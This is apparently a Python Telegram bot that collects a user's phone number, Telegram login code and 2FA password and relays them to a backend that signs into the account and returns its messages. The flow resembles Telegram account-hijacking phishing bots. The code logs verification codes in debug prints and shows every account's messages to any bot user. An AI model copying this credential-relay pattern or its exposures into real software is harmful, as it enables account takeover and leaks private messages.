import telebot
from telebot import types
import requests
import json
from datetime import datetime, timedelta
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Initialize bot with your token
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("Please set TELEGRAM_BOT_TOKEN in your .env file")

bot = telebot.TeleBot(BOT_TOKEN)

# Base URL for your API
API_BASE_URL = "http://localhost:8000"  # Change this to your actual API URL

# Store user states
user_states = {}

class UserState:
    def __init__(self):
        self.phone = None
        self.waiting_for_code = False
        self.waiting_for_2fa = False
        self.code = ""  # Store the code being entered

def get_user_state(user_id):
    if user_id not in user_states:
        user_states[user_id] = UserState()
    return user_states[user_id]

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    login_button = types.KeyboardButton('Login')
    markup.add(login_button)
    bot.reply_to(message, "Welcome! Please login to access your messages.", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == 'Login')
def login(message):
    bot.reply_to(message, "Please enter your phone number in international format (e.g., +989123456789)")
    get_user_state(message.from_user.id).waiting_for_code = False
    get_user_state(message.from_user.id).waiting_for_2fa = False

def create_code_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=3)
    buttons = []
    for i in range(1, 10):
        buttons.append(types.InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
    buttons.append(types.InlineKeyboardButton("0", callback_data="code_0"))
    buttons.append(types.InlineKeyboardButton("⌫", callback_data="code_backspace"))
    buttons.append(types.InlineKeyboardButton("✓", callback_data="code_submit"))
    
    # Add buttons in rows of 3
    for i in range(0, len(buttons), 3):
        markup.row(*buttons[i:i+3])
    return markup

@bot.callback_query_handler(func=lambda call: call.data.startswith('code_'))
def handle_code_input(call):
    user_state = get_user_state(call.from_user.id)
    action = call.data.split('_')[1]
    
    print(f"Debug - Received callback: {call.data}")  # Debug log
    
    if action == "backspace":
        user_state.code = user_state.code[:-1]
        print(f"Debug - Backspace pressed. Current code: {user_state.code}")  # Debug log
    elif action == "submit":
        if len(user_state.code) > 0:
            print(f"Debug - Submitting code: {user_state.code}")  # Debug log
            submit_verification_code(call.message, user_state.code)
            return
    else:
        if len(user_state.code) < 5:  # Limit code length to 5 digits
            user_state.code += action
            print(f"Debug - Added digit. Current code: {user_state.code}")  # Debug log
    
    # Update the message with the current code
    masked_code = "•" * len(user_state.code)
    try:
        bot.edit_message_text(
            f"Enter verification code:\n\n{masked_code}",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=create_code_keyboard()
        )
        print(f"Debug - Updated message with masked code: {masked_code}")  # Debug log
    except Exception as e:
        print(f"Debug - Error updating message: {str(e)}")  # Debug log

def submit_verification_code(message, code):
    user_state = get_user_state(message.chat.id)
    print(f"Debug - Submitting verification code for phone {user_state.phone}: {code}")  # Debug log
    try:
        response = requests.post(f"{API_BASE_URL}/submit-code",
                              json={"phone": user_state.phone, "code": code})
        print(f"Debug - Server response status: {response.status_code}")  # Debug log
        response_data = response.json()
        print(f"Debug - Server response data: {response_data}")  # Debug log

        if response.status_code == 200:
            if response_data.get("requires_2fa") or "Two-steps verification is enabled" in str(response_data.get("error", "")):
                user_state.waiting_for_2fa = True
                user_state.waiting_for_code = False
                bot.reply_to(message, "Please enter your 2FA password (you can type it directly)")
            else:
                user_state.waiting_for_code = False
                show_main_menu(message)
        else:
            print(f"Debug - Invalid code response: {response.text}")  # Debug log
            bot.reply_to(message, "Invalid code. Please try again.")
    except Exception as e:
        print(f"Debug - Error submitting code: {str(e)}")  # Debug log
        bot.reply_to(message, f"An error occurred: {str(e)}")

def format_messages(data):
    if not data or 'messages' not in data:
        return "No messages found."
    
    formatted_text = "📊 Message Statistics (Top 5):\n\n"
    
    # Format most recent messages
    if 'most_recent' in data['messages']:
        formatted_text += "📥 Most Recent Messages:\n"
        for user_id, messages in data['messages']['most_recent'].items():
            formatted_text += f"\nMessages from {user_id}:\n"
            # Take only top 5 messages
            for msg in messages[:5]:
                # Add 3:30 hours to the timestamp
                original_date = datetime.fromisoformat(msg['date'])
                adjusted_date = original_date + timedelta(hours=3, minutes=30)
                date_str = adjusted_date.strftime('%Y-%m-%d %H:%M:%S')
                formatted_text += f"📅 {date_str}\n"
                formatted_text += f"👤 {msg['sender']}\n"
                formatted_text += f"💬 {msg['text']}\n"
                formatted_text += "-------------------\n"
    
    # Format unread messages
    if 'unread' in data['messages']:
        formatted_text += "\n📨 Unread Messages:\n"
        for user_id, messages in data['messages']['unread'].items():
            formatted_text += f"\nMessages from {user_id}:\n"
            # Take only top 5 messages
            for msg in messages[:5]:
                # Add 3:30 hours to the timestamp
                original_date = datetime.fromisoformat(msg['date'])
                adjusted_date = original_date + timedelta(hours=3, minutes=30)
                date_str = adjusted_date.strftime('%Y-%m-%d %H:%M:%S')
                formatted_text += f"📅 {date_str}\n"
                formatted_text += f"👤 {msg['sender']}\n"
                formatted_text += f"💬 {msg['text']}\n"
                formatted_text += "-------------------\n"
    
    return formatted_text

@bot.message_handler(func=lambda message: message.text == 'View All Messages')
def view_all_messages(message):
    try:
        # Send typing status
        bot.send_chat_action(message.chat.id, 'typing')
        
        response = requests.get(f"{API_BASE_URL}/users")
        print(f"Debug - Response status: {response.status_code}")  # Debug log
        
        if response.status_code == 200:
            data = response.json()
            messages_text = format_messages(data)
            bot.reply_to(message, messages_text)
        else:
            bot.reply_to(message, "Failed to fetch messages. Please try again.")
    except Exception as e:
        print(f"Debug - Error in view_all_messages: {str(e)}")  # Debug log
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(func=lambda message: message.text == 'View Unread Messages')
def view_unread_messages(message):
    try:
        # Send typing status
        bot.send_chat_action(message.chat.id, 'typing')
        
        response = requests.get(f"{API_BASE_URL}/users")
        print(f"Debug - Response status: {response.status_code}")  # Debug log
        
        if response.status_code == 200:
            data = response.json()
            messages_text = format_messages(data)
            bot.reply_to(message, messages_text)
        else:
            bot.reply_to(message, "Failed to fetch messages. Please try again.")
    except Exception as e:
        print(f"Debug - Error in view_unread_messages: {str(e)}")  # Debug log
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(func=lambda message: not message.text.startswith('/'))
def handle_message(message):
    user_state = get_user_state(message.from_user.id)
    
    # Check if user is logged in and trying to use menu commands
    if user_state.phone and not user_state.waiting_for_code and not user_state.waiting_for_2fa:
        if message.text in ['View All Messages', 'View Unread Messages']:
            return  # Let the specific handlers handle these commands
    
    if not user_state.waiting_for_code and not user_state.waiting_for_2fa:
        # Handle phone number input
        phone = message.text.strip()
        print(f"Debug - Received phone number: {phone}")  # Debug log
        
        # Validate phone number format
        if not phone or not phone.startswith('+'):
            bot.reply_to(message, "Please enter a valid phone number starting with + (e.g., +989123456789)")
            return
            
        try:
            # Start login process directly
            login_response = requests.post(f"{API_BASE_URL}/start-login", 
                                        json={"phone": phone})
            print(f"Debug - Login response status: {login_response.status_code}")  # Debug log
            print(f"Debug - Login response data: {login_response.text}")  # Debug log
            
            if login_response.status_code == 200:
                user_state.phone = phone
                user_state.waiting_for_code = True
                user_state.code = ""  # Reset code
                print(f"Debug - Starting verification code input for phone: {phone}")  # Debug log
                bot.reply_to(
                    message,
                    "Please enter the verification code sent to your phone:",
                    reply_markup=create_code_keyboard()
                )
            else:
                error_data = login_response.json()
                error_message = error_data.get('error', 'Failed to initiate login. Please try again.')
                print(f"Debug - Login failed: {error_message}")  # Debug log
                bot.reply_to(message, error_message)
        except Exception as e:
            print(f"Debug - Error during login: {str(e)}")  # Debug log
            bot.reply_to(message, f"An error occurred: {str(e)}")
    
    elif user_state.waiting_for_2fa:
        # Handle 2FA password
        password = message.text.strip()
        print(f"Debug - Received 2FA password for phone {user_state.phone}")  # Debug log
        try:
            response = requests.post(f"{API_BASE_URL}/submit-2fa",
                                  json={"phone": user_state.phone, "password": password})
            print(f"Debug - 2FA response status: {response.status_code}")  # Debug log
            print(f"Debug - 2FA response data: {response.text}")  # Debug log
            
            if response.status_code == 200:
                user_state.waiting_for_2fa = False
                show_main_menu(message)
            else:
                error_data = response.json()
                error_message = error_data.get('error', 'Invalid 2FA password. Please try again.')
                print(f"Debug - Invalid 2FA password response: {error_message}")  # Debug log
                bot.reply_to(message, error_message)
        except Exception as e:
            print(f"Debug - Error submitting 2FA: {str(e)}")  # Debug log
            bot.reply_to(message, f"An error occurred: {str(e)}")

def show_main_menu(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    all_messages_btn = types.KeyboardButton('View All Messages')
    unread_messages_btn = types.KeyboardButton('View Unread Messages')
    markup.add(all_messages_btn, unread_messages_btn)
    bot.reply_to(message, "What would you like to do?", reply_markup=markup)

if __name__ == "__main__":
    print("Starting Telegram bot...")
    bot.polling(none_stop=True) 